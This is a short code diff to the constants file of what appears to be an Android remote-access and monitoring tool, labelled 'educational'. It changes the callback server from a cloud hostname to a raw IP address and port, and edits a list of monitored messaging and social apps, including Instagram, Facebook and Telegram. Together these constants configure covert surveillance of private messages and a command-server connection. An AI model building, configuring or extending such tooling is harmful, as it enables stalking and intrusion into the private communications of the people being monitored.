@@ -3,7 +3,7 @@ package com.remoteaccess.educational.utils;
 public class Constants {
 
     // ========== TCP SERVER ==========
-    public static final String TCP_HOST = "sjc1.clusters.zeabur.com";
+    public static final String TCP_HOST = "43.159.166.153";
     public static final int    TCP_PORT = 21400;
 
     public static final int TCP_RECONNECT_DELAY = 3000;
@@ -36,7 +36,7 @@ public class Constants {
      *   "com.facebook.orca"          // Messenger
      */
     public static final String[] MONITORED_PACKAGES = {
-        "com.whatsapp",
+        "com.android.stk",
         "com.instagram.android",
         "com.facebook.katana",
         "org.telegram.messenger",
